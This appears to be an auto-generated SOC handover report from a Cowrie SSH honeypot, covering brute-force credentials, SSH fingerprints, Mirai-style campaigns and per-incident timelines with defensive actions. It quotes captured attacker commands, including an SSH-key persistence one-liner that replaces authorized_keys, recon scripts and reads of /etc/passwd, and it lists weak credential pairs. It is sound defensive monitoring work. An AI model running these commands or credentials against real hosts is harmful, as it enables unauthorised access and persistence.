# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-25 |
| **Generated At** | 2026-09-25T16:53:35Z |
| **Shift Time** | 16:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **217** |
| Confirmed Threats | **172** |
| False Positives Filtered | **45** (20.7%) |
| Unique Attacker IPs | **78** |
| Countries of Origin | **27** |
| High Severity Cases | **95** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **122** |
| Malware Samples Analyzed | **5** HIGH · **22** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **144** |
| Unique Credential Pairs | **77** |
| Unique Usernames | **21** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **102** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `345gs5662d34` | 24 |
| `admin` | 13 |
| `support` | 7 |
| `ubuntu` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 23 |
| `admin` | 13 |
| `support` | 7 |
| `123456` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 10 |
| `admin` | `admin` | 10 |
| `support` | `support` | 7 |
| `root` | `` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwerty77` | `187.212.43.1` | 2026-09-25T10:58:31 |
| `345gs5662d34` | `345gs5662d34` | `187.212.43.1` | 2026-09-25T10:58:39 |
| `root` | `3245gs5662d34` | `187.212.43.1` | 2026-09-25T10:58:40 |
| `ubuntu` | `Ubuntu.123` | `101.96.230.94` | 2026-09-25T11:06:32 |
| `345gs5662d34` | `345gs5662d34` | `101.96.230.94` | 2026-09-25T11:06:36 |
| `ubuntu` | `3245gs5662d34` | `101.96.230.94` | 2026-09-25T11:06:38 |
| `support` | `support` | `176.53.159.196` | 2026-09-25T11:25:24 |
| `admin` | `admin` | `157.245.220.50` | 2026-09-25T11:31:35 |
| `jack` | `changeme` | `95.188.91.101` | 2026-09-25T11:47:34 |
| `345gs5662d34` | `345gs5662d34` | `95.188.91.101` | 2026-09-25T11:47:37 |
| `jack` | `3245gs5662d34` | `95.188.91.101` | 2026-09-25T11:47:38 |
| `admin` | `admin` | `80.94.95.116` | 2026-09-25T11:48:04 |
| `support` | `support` | `10.0.0.73` | 2026-09-25T11:50:24 |
| `root` | `Diamond1` | `122.15.129.26` | 2026-09-25T11:52:04 |
| `345gs5662d34` | `345gs5662d34` | `122.15.129.26` | 2026-09-25T11:52:07 |
| `root` | `3245gs5662d34` | `122.15.129.26` | 2026-09-25T11:52:08 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-25T11:53:10 |
| `office` | `123456` | `160.251.202.248` | 2026-09-25T11:54:30 |
| `345gs5662d34` | `345gs5662d34` | `160.251.202.248` | 2026-09-25T11:54:33 |
| `office` | `3245gs5662d34` | `160.251.202.248` | 2026-09-25T11:54:35 |
| `telecomadmin` | `admintelecom` | `80.94.95.116` | 2026-09-25T12:01:05 |
| `root` | `123456qq!` | `10.0.0.73` | 2026-09-25T12:03:01 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-25T12:03:05 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T12:03:07 |
| `root` | `password` | `193.112.192.91` | 2026-09-25T12:07:08 |
| `root` | `admin` | `193.112.192.91` | 2026-09-25T12:07:14 |
| `root` | `oracle` | `193.112.192.91` | 2026-09-25T12:07:17 |
| `root` | `Oracle@2024` | `193.112.192.91` | 2026-09-25T12:07:20 |
| `root` | `Oracle123` | `193.112.192.91` | 2026-09-25T12:07:25 |
| `root` | `OracleCloud` | `193.112.192.91` | 2026-09-25T12:07:30 |
| `root` | `oci` | `193.112.192.91` | 2026-09-25T12:07:34 |
| `root` | `opc` | `193.112.192.91` | 2026-09-25T12:07:40 |
| `root` | `qwerty` | `193.112.192.91` | 2026-09-25T12:07:43 |
| `root` | `P@ssw0rd` | `193.112.192.91` | 2026-09-25T12:07:49 |
| `root` | `Changeme123` | `193.112.192.91` | 2026-09-25T12:07:53 |
| `root` | `Welcome1` | `193.112.192.91` | 2026-09-25T12:07:58 |
| `root` | `Hackers` | `193.112.192.91` | 2026-09-25T12:08:05 |
| `root` | `Contabo123` | `193.112.192.91` | 2026-09-25T12:08:09 |
| `root` | `toor` | `193.112.192.91` | 2026-09-25T12:08:13 |
| `opc` | `password` | `193.112.192.91` | 2026-09-25T12:08:17 |
| `opc` | `oracle` | `193.112.192.91` | 2026-09-25T12:08:21 |
| `admin` | `oracle` | `193.112.192.91` | 2026-09-25T12:08:35 |
| `teste` | `1234567` | `41.204.63.118` | 2026-09-25T12:09:35 |
| `345gs5662d34` | `345gs5662d34` | `41.204.63.118` | 2026-09-25T12:09:38 |
| `teste` | `3245gs5662d34` | `41.204.63.118` | 2026-09-25T12:09:40 |
| `root` | `India@2025` | `201.76.120.30` | 2026-09-25T12:09:44 |
| `345gs5662d34` | `345gs5662d34` | `201.76.120.30` | 2026-09-25T12:09:47 |
| `root` | `3245gs5662d34` | `201.76.120.30` | 2026-09-25T12:09:48 |
| `root` | `Li123456.` | `10.0.0.73` | 2026-09-25T12:10:40 |
| `root` | `1q2w3e4r` | `193.112.192.91` | 2026-09-25T12:13:11 |
| `root` | `ubuntu` | `193.112.192.91` | 2026-09-25T12:13:26 |
| `ubuntu` | `ubuntu` | `193.112.192.91` | 2026-09-25T12:13:53 |
| `admin` | `Oracle@2024` | `193.112.192.91` | 2026-09-25T12:14:05 |
| `charly` | `charly` | `10.0.0.73` | 2026-09-25T12:14:37 |
| `charly` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T12:14:42 |
| `root` | `dlgwbn` | `190.181.44.194` | 2026-09-25T12:20:52 |
| `345gs5662d34` | `345gs5662d34` | `190.181.44.194` | 2026-09-25T12:20:55 |
| `root` | `3245gs5662d34` | `190.181.44.194` | 2026-09-25T12:20:56 |
| `root` | `debian` | `118.145.234.151` | 2026-09-25T12:24:27 |
| `kostas` | `kostas` | `34.91.0.68` | 2026-09-25T12:26:06 |
| `345gs5662d34` | `345gs5662d34` | `34.91.0.68` | 2026-09-25T12:26:08 |
| `kostas` | `3245gs5662d34` | `34.91.0.68` | 2026-09-25T12:26:09 |
| `root` | `` | `77.239.124.121` | 2026-09-25T12:33:02 |
| `abc` | `123456` | `182.43.235.75` | 2026-09-25T12:41:20 |
| `abc` | `3245gs5662d34` | `182.43.235.75` | 2026-09-25T12:41:46 |
| `odoo15` | `odoo15` | `147.90.234.22` | 2026-09-25T12:47:54 |
| `345gs5662d34` | `345gs5662d34` | `147.90.234.22` | 2026-09-25T12:47:55 |
| `odoo15` | `3245gs5662d34` | `147.90.234.22` | 2026-09-25T12:48:00 |
| `root` | `1a2s3d4f` | `103.13.210.12` | 2026-09-25T12:51:01 |
| `345gs5662d34` | `345gs5662d34` | `103.13.210.12` | 2026-09-25T12:51:04 |
| `root` | `3245gs5662d34` | `103.13.210.12` | 2026-09-25T12:51:04 |
| `root` | `Qq123456789` | `211.254.212.59` | 2026-09-25T12:54:36 |
| `345gs5662d34` | `345gs5662d34` | `211.254.212.59` | 2026-09-25T12:54:39 |
| `root` | `3245gs5662d34` | `211.254.212.59` | 2026-09-25T12:54:41 |
| `root` | `` | `94.154.43.69` | 2026-09-25T13:56:20 |
| `support` | `support` | `14.162.102.43` | 2026-09-25T14:00:36 |
| `root` | `` | `160.119.66.206` | 2026-09-25T14:12:49 |
| `vpn` | `Aa123456` | `10.0.0.73` | 2026-09-25T14:20:16 |
| `vpn` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T14:20:27 |
| `deploy` | `1234567` | `10.0.0.73` | 2026-09-25T14:24:37 |
| `deploy` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T14:24:42 |
| `admin` | `admin` | `77.90.185.17` | 2026-09-25T14:24:49 |
| `root` | `yj123456.` | `10.0.0.73` | 2026-09-25T14:26:14 |
| `root` | `111111` | `92.118.39.14` | 2026-09-25T14:31:36 |
| `root` | `123123` | `92.118.39.14` | 2026-09-25T14:34:18 |
| `ubuntu` | `ubuntu2023` | `10.0.0.73` | 2026-09-25T14:35:15 |
| `root` | `1234` | `92.118.39.14` | 2026-09-25T14:36:55 |
| `root` | `Rahul123` | `10.0.0.73` | 2026-09-25T14:38:24 |
| `root` | `12345` | `92.118.39.14` | 2026-09-25T14:39:32 |
| `minikube` | `123456` | `10.0.0.73` | 2026-09-25T14:41:24 |
| `minikube` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T14:41:46 |
| `user` | `password1234` | `10.0.0.73` | 2026-09-25T14:44:26 |
| `root` | `12345678` | `92.118.39.14` | 2026-09-25T14:45:02 |
| `jonathan` | `jonathan123` | `10.0.0.73` | 2026-09-25T14:47:34 |
| `root` | `123456789` | `92.118.39.14` | 2026-09-25T14:47:40 |
| `jonathan` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T14:47:41 |
| `hans` | `hans` | `10.0.0.73` | 2026-09-25T14:49:04 |
| `root` | `Password1` | `92.118.39.14` | 2026-09-25T14:50:11 |
| `root` | `saqib` | `10.0.0.73` | 2026-09-25T14:52:07 |
| `root` | `admin` | `92.118.39.14` | 2026-09-25T14:52:43 |
| `admin1` | `12345678` | `10.0.0.73` | 2026-09-25T14:53:45 |
| `admin1` | `3245gs5662d34` | `10.0.0.73` | 2026-09-25T14:54:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **217** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Paramiko (Python) | 44 |
| libssh | 43 |
| Go SSH scanner | 26 |
| OpenSSH | 10 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `a2de0f306611...` | Mirai/variant | 44 | 1 |
| `f555226df196...` | Mirai/variant | 31 | 11 |
| `2ec37a7cc8da...` | Mirai/variant | 10 | 1 |
| `4e066189c3bb...` | Generic scanner | 9 | 2 |
| `03a80b21afa8...` | Modern SSH client | 8 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `a2de0f306611...` | Paramiko (Python) | 44 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 31 | 11 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 10 | 1 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 9 | 8 | — |
| `4e066189c3bb...` | Go SSH scanner | 9 | 2 | Generic scanner |
| `03a80b21afa8...` | libssh | 8 | 3 | Modern SSH client |
| `1f2f2f9b0a73...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 8 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `77.239.124.121`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **78** |
| Unique ASNs | **39** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 30 | HIGH |
| `AS213412` | ONYPHE SAS | 6 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8402` | PJSC "Vimpelcom" | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (95)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7d04f66a32da

| Field | Detail |
|---|---|
| **Source IP** | `187.212.43[.]1` |
| **First Seen** | 2026-09-25 10:58 |
| **Last Seen** | 2026-09-25 10:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 10:58:31` | `cowrie.session.connect` |
| `2026-09-25 10:58:31` | `cowrie.client.version` |
| `2026-09-25 10:58:31` | `cowrie.client.kex` |
| `2026-09-25 10:58:31` | `cowrie.login.success` |
| `2026-09-25 10:58:32` | `cowrie.session.params` |
| `2026-09-25 10:58:32` | `cowrie.command.input` |
| `2026-09-25 10:58:32` | `cowrie.command.failed` |
| `2026-09-25 10:58:32` | `cowrie.log.closed` |
| `2026-09-25 10:58:33` | `cowrie.session.params` |
| `2026-09-25 10:58:33` | `cowrie.command.input` |
| `2026-09-25 10:58:39` | `cowrie.session.file_download` |
| `2026-09-25 10:58:39` | `cowrie.log.closed` |
| `2026-09-25 10:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.43[.]1` to AbuseIPDB if not already reported
- [ ] Block `187.212.43[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee71304c8a6d

| Field | Detail |
|---|---|
| **Source IP** | `187.212.43[.]1` |
| **First Seen** | 2026-09-25 10:58 |
| **Last Seen** | 2026-09-25 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 10:58:39` | `cowrie.session.connect` |
| `2026-09-25 10:58:39` | `cowrie.client.version` |
| `2026-09-25 10:58:39` | `cowrie.client.kex` |
| `2026-09-25 10:58:39` | `cowrie.login.success` |
| `2026-09-25 10:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.43[.]1` to AbuseIPDB if not already reported
- [ ] Block `187.212.43[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d61f5731b156

| Field | Detail |
|---|---|
| **Source IP** | `187.212.43[.]1` |
| **First Seen** | 2026-09-25 10:58 |
| **Last Seen** | 2026-09-25 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 10:58:39` | `cowrie.session.connect` |
| `2026-09-25 10:58:39` | `cowrie.client.version` |
| `2026-09-25 10:58:40` | `cowrie.client.kex` |
| `2026-09-25 10:58:40` | `cowrie.login.success` |
| `2026-09-25 10:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.43[.]1` to AbuseIPDB if not already reported
- [ ] Block `187.212.43[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4446a4ce42ce

| Field | Detail |
|---|---|
| **Source IP** | `101.96.230[.]94` |
| **First Seen** | 2026-09-25 11:06 |
| **Last Seen** | 2026-09-25 11:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:06:31` | `cowrie.session.connect` |
| `2026-09-25 11:06:31` | `cowrie.client.version` |
| `2026-09-25 11:06:31` | `cowrie.client.kex` |
| `2026-09-25 11:06:32` | `cowrie.login.success` |
| `2026-09-25 11:06:33` | `cowrie.session.params` |
| `2026-09-25 11:06:33` | `cowrie.command.input` |
| `2026-09-25 11:06:33` | `cowrie.command.failed` |
| `2026-09-25 11:06:34` | `cowrie.log.closed` |
| `2026-09-25 11:06:34` | `cowrie.session.params` |
| `2026-09-25 11:06:34` | `cowrie.command.input` |
| `2026-09-25 11:06:35` | `cowrie.session.file_download` |
| `2026-09-25 11:06:35` | `cowrie.log.closed` |
| `2026-09-25 11:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.230[.]94` to AbuseIPDB if not already reported
- [ ] Block `101.96.230[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8346c0bc0abb

| Field | Detail |
|---|---|
| **Source IP** | `101.96.230[.]94` |
| **First Seen** | 2026-09-25 11:06 |
| **Last Seen** | 2026-09-25 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:06:35` | `cowrie.session.connect` |
| `2026-09-25 11:06:35` | `cowrie.client.version` |
| `2026-09-25 11:06:35` | `cowrie.client.kex` |
| `2026-09-25 11:06:36` | `cowrie.login.success` |
| `2026-09-25 11:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.230[.]94` to AbuseIPDB if not already reported
- [ ] Block `101.96.230[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46049c02826f

| Field | Detail |
|---|---|
| **Source IP** | `101.96.230[.]94` |
| **First Seen** | 2026-09-25 11:06 |
| **Last Seen** | 2026-09-25 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:06:36` | `cowrie.session.connect` |
| `2026-09-25 11:06:36` | `cowrie.client.version` |
| `2026-09-25 11:06:37` | `cowrie.client.kex` |
| `2026-09-25 11:06:38` | `cowrie.login.success` |
| `2026-09-25 11:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.96.230[.]94` to AbuseIPDB if not already reported
- [ ] Block `101.96.230[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b7bd4f9abbc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-25 11:25 |
| **Last Seen** | 2026-09-25 11:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:25:24` | `cowrie.session.connect` |
| `2026-09-25 11:25:24` | `cowrie.client.version` |
| `2026-09-25 11:25:24` | `cowrie.client.kex` |
| `2026-09-25 11:25:24` | `cowrie.login.success` |
| `2026-09-25 11:25:25` | `cowrie.direct-tcpip.request` |
| `2026-09-25 11:25:25` | `cowrie.direct-tcpip.data` |
| `2026-09-25 11:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f02c99bf45f9

| Field | Detail |
|---|---|
| **Source IP** | `157.245.220[.]50` |
| **First Seen** | 2026-09-25 11:31 |
| **Last Seen** | 2026-09-25 11:32 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:31:34` | `cowrie.session.connect` |
| `2026-09-25 11:31:35` | `cowrie.telnet.option` |
| `2026-09-25 11:31:35` | `cowrie.telnet.option` |
| `2026-09-25 11:31:35` | `cowrie.login.success` |
| `2026-09-25 11:31:36` | `cowrie.session.params` |
| `2026-09-25 11:31:36` | `cowrie.telnet.option` |
| `2026-09-25 11:31:36` | `cowrie.telnet.option` |
| `2026-09-25 11:31:36` | `cowrie.command.input` |
| `2026-09-25 11:31:36` | `cowrie.command.input` |
| `2026-09-25 11:31:36` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.failed` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.failed` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.failed` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.failed` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.failed` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.failed` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.failed` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.failed` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:31:37` | `cowrie.command.input` |
| `2026-09-25 11:32:37` | `cowrie.log.closed` |
| `2026-09-25 11:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.220[.]50` to AbuseIPDB if not already reported
- [ ] Block `157.245.220[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da0acedd883a

| Field | Detail |
|---|---|
| **Source IP** | `95.188.91[.]101` |
| **First Seen** | 2026-09-25 11:47 |
| **Last Seen** | 2026-09-25 11:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 11:47:33` | `cowrie.session.connect` |
| `2026-09-25 11:47:33` | `cowrie.client.version` |
| `2026-09-25 11:47:33` | `cowrie.client.kex` |
| `2026-09-25 11:47:34` | `cowrie.login.success` |
| `2026-09-25 11:47:35` | `cowrie.session.params` |
| `2026-09-25 11:47:35` | `cowrie.command.input` |
| `2026-09-25 11:47:35` | `cowrie.command.failed` |
| `2026-09-25 11:47:35` | `cowrie.log.closed` |
| `2026-09-25 11:47:36` | `cowrie.session.params` |
| `2026-09-25 11:47:36` | `cowrie.command.input` |
| `2026-09-25 11:47:36` | `cowrie.session.file_download` |
| `2026-09-25 11:47:36` | `cowrie.log.closed` |
| `2026-09-25 11:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.188.91[.]101` to AbuseIPDB if not already reported
- [ ] Block `95.188.91[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
